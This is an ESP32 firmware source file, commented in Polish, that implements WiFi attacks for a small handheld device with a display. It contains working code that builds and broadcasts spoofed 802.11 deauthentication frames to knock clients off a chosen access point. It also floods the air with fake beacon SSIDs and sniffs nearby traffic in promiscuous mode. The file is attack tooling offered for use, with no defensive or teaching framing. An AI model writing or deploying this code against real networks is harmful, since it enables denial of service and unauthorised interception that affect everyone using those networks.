#include "wifi_attacks.h"
#include <WiFi.h>
#include "esp_system.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_interface.h"
#include "display.h"
#include "buttons.h"

extern U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2;
static bool attackRunning = false;

void initWiFiAttacks() {
    // Inicjalizacja NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    // Inicjalizacja WiFi
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
}

std::vector<NetworkInfo> scanNetworks() {
    std::vector<NetworkInfo> networks;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        NetworkInfo network;
        network.ssid = WiFi.SSID(i);
        memcpy(network.bssid, WiFi.BSSID(i), 6);
        network.channel = WiFi.channel(i);
        network.rssi = WiFi.RSSI(i);
        networks.push_back(network);
    }
    return networks;
}

// Struktura pakietu deauth
typedef struct {
    uint8_t header[24];
    uint8_t deauthReason[2];
} deauth_packet_t;

void startDeauthAttack(NetworkInfo target, int packets) {
    attackRunning = true;
    
    // Konfiguracja pakietu deauth
    deauth_packet_t packet;
    memset(&packet, 0, sizeof(packet));
    
    // Frame Control
    packet.header[0] = 0xC0; // Deauth frame
    packet.header[1] = 0x00;
    
    // Duration
    packet.header[2] = 0x00;
    packet.header[3] = 0x00;
    
    // Destination (broadcast)
    for(int i = 0; i < 6; i++) {
        packet.header[4 + i] = 0xFF;
    }
    
    // Source (AP BSSID)
    memcpy(&packet.header[10], target.bssid, 6);
    
    // BSSID
    memcpy(&packet.header[16], target.bssid, 6);
    
    // Sequence number
    packet.header[22] = 0x00;
    packet.header[23] = 0x00;
    
    // Reason code (1 = Unspecified reason)
    packet.deauthReason[0] = 0x01;
    packet.deauthReason[1] = 0x00;

    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    
    while(attackRunning && packets > 0) {
        esp_wifi_80211_tx(WIFI_IF_STA, &packet, sizeof(packet), false);
        packets--;
        
        // Wyświetl status
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tf);
        u8g2.drawStr(0, 10, ("Deauth: " + target.ssid).c_str());
        u8g2.drawStr(0, 20, ("Packets left: " + String(packets)).c_str());
        u8g2.sendBuffer();
        
        if(digitalRead(buttonBackPin) == LOW) {
            attackRunning = false;
        }
        delay(1);
    }
}

void startBeaconSpam(String baseSSID, int numNetworks) {
    attackRunning = true;
    uint8_t beacon_raw[] = {
        0x80, 0x00,             // Frame Control
        0x00, 0x00,             // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Destination
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,     // Source
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,     // BSSID
        0x00, 0x00,             // Sequence Control
        // Fixed parameters
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Timestamp
        0x64, 0x00,             // Beacon Interval
        0x31, 0x04,             // Capability Info
        // Tagged parameters
        0x00                    // SSID parameter
    };
    
    while(attackRunning) {
        for(int i = 0; i < numNetworks && attackRunning; i++) {
            String ssid = baseSSID + String(i);
            
            // Aktualizuj SSID w pakiecie
            uint8_t beacon_packet[200];
            memcpy(beacon_packet, beacon_raw, sizeof(beacon_raw));
            beacon_packet[sizeof(beacon_raw)] = ssid.length();
            memcpy(&beacon_packet[sizeof(beacon_raw) + 1], ssid.c_str(), ssid.length());
            
            // Wyślij pakiet
            esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_raw) + 1 + ssid.length(), false);
            
            // Wyświetl status
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tf);
            u8g2.drawStr(0, 10, ("Beacon Spam"));
            u8g2.drawStr(0, 20, (ssid).c_str());
            u8g2.sendBuffer();
            
            if(digitalRead(buttonBackPin) == LOW) {
                attackRunning = false;
            }
            delay(1);
        }
    }
}

void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
    if(!attackRunning) return;
    
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    
    char addr1[18] = {0};
    char addr2[18] = {0};
    
    sprintf(addr1, "%02x:%02x:%02x:%02x:%02x:%02x",
        hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
        hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
    sprintf(addr2, "%02x:%02x:%02x:%02x:%02x:%02x",
        hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
        hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(0, 10, "Sniffing...");
    u8g2.drawStr(0, 20, addr1);
    u8g2.drawStr(0, 30, addr2);
    u8g2.sendBuffer();
}

void startPacketSniffing(NetworkInfo target) {
    attackRunning = true;
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    
    while(attackRunning) {
        if(digitalRead(buttonBackPin) == LOW) {
            attackRunning = false;
        }
        delay(10);
    }
    
    esp_wifi_set_promiscuous(false);
}

void stopCurrentAttack() {
    attackRunning = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_STA);
} 